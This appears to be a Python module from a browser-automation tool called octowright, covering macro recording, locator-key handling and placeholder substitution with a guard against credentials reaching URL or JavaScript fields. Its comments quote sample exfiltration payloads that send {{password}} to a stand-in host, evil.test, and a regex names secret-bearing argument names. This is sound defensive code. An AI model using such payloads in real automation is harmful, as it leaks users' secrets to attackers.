# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

from __future__ import annotations

import copy
import os
import re
from typing import Any

SEMANTIC_LOCATOR_KEYS = (
    "role",
    "role_name",
    "label",
    "text",
    "test_id",
    "role_exact",
    "label_exact",
    "text_exact",
)
#: The keys that can actually RESOLVE an element. build_locator requires
#: exactly one of these; everything else in SEMANTIC_LOCATOR_KEYS is a modifier
#: (`role_name` narrows a role, the `*_exact` flags narrow the match), so
#: "has a semantic key" must never be read as "has a locator".
SEMANTIC_FINDER_KEYS = ("role", "label", "text", "test_id")
# Keys that carry no human-readable ARIA text and so are noise in a digest.
# The *_exact flags are modifiers on another key, never a name themselves.
NON_ARIA_NOISE_KEYS = ("role", "role_name", "test_id", "role_exact", "label_exact", "text_exact")
# Bookkeeping the recorder and the scenario layer stamp onto an event. None is
# an input to any session method, so all of them are stripped before dispatch.
# `persona` and `scenario_role` come from scenarios_pool, which stamps both onto
# every merged tail event; without them here, replaying a scenario-derived
# recording raises TypeError: navigate() got an unexpected keyword argument.
#
# `scenario_role` is spelled that way BECAUSE stripping cannot fix a collision.
# Writing the label to `role` collides: `role` is also the ARIA locator key
# on click/fill/click_by/fill_by/get_text_by — and `strip_non_aria_noise` returns
# those actions untouched precisely because `role` is their locator. So the label
# would both destroy a recorded ARIA role and inject one where there was none, with
# nothing downstream able to tell the two apart. Renaming at the source is the
# only fix; do not re-add a bare `role` here.
RECORDING_NOISE_KEYS = ("action", "ts", "kind", "profile", "instance_id", "persona", "scenario_role")


def normalise_parameters(parameters: list[str] | dict[str, str] | None) -> dict[str, str]:
    if parameters is None:
        return {}
    if isinstance(parameters, dict):
        return parameters
    return {f"params[{i}]": v for i, v in enumerate(parameters)}


def substitute_in_action(action: dict[str, Any], value_to_name: dict[str, str]) -> dict[str, Any]:
    result: dict[str, Any] = {}
    for key, value in action.items():
        if isinstance(value, str) and value in value_to_name:
            result[key] = "{{" + value_to_name[value] + "}}"
        else:
            result[key] = value
    return result


def action_kwargs(action: dict[str, Any]) -> dict[str, Any]:
    return {key: value for key, value in action.items() if key not in RECORDING_NOISE_KEYS}


#: Actions whose locator IS the semantic keys, so stripping them would remove
#: the thing the action matches on. Enumerated rather than inferred, and it has
#: already been missed once: get_text_by was absent, so replaying one called
#: session.get_text_by() with no finder at all.
_SEMANTIC_ACTIONS = {"click", "fill", "click_by", "fill_by", "get_text_by"}


def strip_non_aria_noise(kind: str, kwargs: dict[str, Any]) -> dict[str, Any]:
    if kind in _SEMANTIC_ACTIONS:
        return dict(kwargs)

    cleaned = dict(kwargs)
    for key in NON_ARIA_NOISE_KEYS:
        cleaned.pop(key, None)
    return cleaned


# Action fields that either leave the machine or execute code. A credential
# expanded into one of these is exfiltration, not automation:
# ``{"action": "navigate", "url": "https://evil.test/?p={{password}}"}`` sends
# the secret to whoever wrote the macro, and ``evaluate`` hands it to page JS.
#
# The set is by FIELD NAME, so it has to grow whenever a new action introduces
# a differently-spelled code sink. ``a11y_dragdrop`` did exactly that: its
# ``verify_js`` and ``grabbed_predicate_js`` are handed straight to
# ``locator.evaluate``/``target.evaluate``, so
# ``{"action": "a11y_dragdrop", "verify_js": "() => fetch('https://evil.test/?p={{password}}')"}``
# was an unguarded ``evaluate`` under a different name.
CREDENTIAL_UNSAFE_KEYS = frozenset({"url", "expression", "verify_js", "grabbed_predicate_js"})

#: Arg names whose value is treated as a secret. Deliberately name-based: the
#: substituter sees opaque caller-supplied args and has no other signal, and
#: matching on the name is what lets ``{{order_id}}`` keep working in a URL
#: (the common parameterized-navigation pattern) while ``{{password}}`` does
#: not.
_CREDENTIAL_ARG_RE = re.compile(
    r"(?:^|_)(?:password|passwd|secret|token|otp|api_key|apikey|credential|auth)(?:$|_)",
    re.IGNORECASE,
)

_CREDENTIAL_SINKS_OFF = frozenset({"0", "off", "false", "no", "never", "none", "disabled", "allow"})


def credential_sinks_blocked() -> bool:
    """Whether to refuse a credential-named arg in a navigation/code sink.

    ON by default. Set ``OCTOWRIGHT_MACRO_CREDENTIAL_SINKS`` to a falsey token
    (or ``allow``) for a suite that intentionally puts a token in a URL --
    an API-key query parameter is the legitimate case this would otherwise
    break.
    """
    raw = os.environ.get("OCTOWRIGHT_MACRO_CREDENTIAL_SINKS", "block").strip().lower()
    return raw not in _CREDENTIAL_SINKS_OFF


def is_credential_arg(name: str) -> bool:
    return bool(_CREDENTIAL_ARG_RE.search(name))


def _substitute_value(value: Any, args: dict[str, Any], *, unsafe_sink: bool = False) -> Any:
    if isinstance(value, str):

        def replacer(match: re.Match[str]) -> str:
            key = match.group(1)
            if key not in args:
                raise KeyError(f"placeholder {{{{{key}}}}} has no matching arg; available: {list(args)}")
            if unsafe_sink and is_credential_arg(key) and credential_sinks_blocked():
                raise ValueError(
                    f"macro expands credential arg {{{{{key}}}}} into a navigation or code sink; "
                    "this would send the secret off-machine. Set "
                    "OCTOWRIGHT_MACRO_CREDENTIAL_SINKS=allow if that is intended."
                )
            return str(args[key])

        return re.sub(r"\{\{([^}]+)\}\}", replacer, value)
    if isinstance(value, dict):
        return {
            key: _substitute_value(item, args, unsafe_sink=unsafe_sink or key in CREDENTIAL_UNSAFE_KEYS)
            for key, item in value.items()
        }
    if isinstance(value, list):
        return [_substitute_value(item, args, unsafe_sink=unsafe_sink) for item in value]
    return value


def substitute(actions: list[dict[str, Any]], args: dict[str, Any]) -> list[dict[str, Any]]:
    return [_substitute_value(copy.deepcopy(action), args) for action in actions]
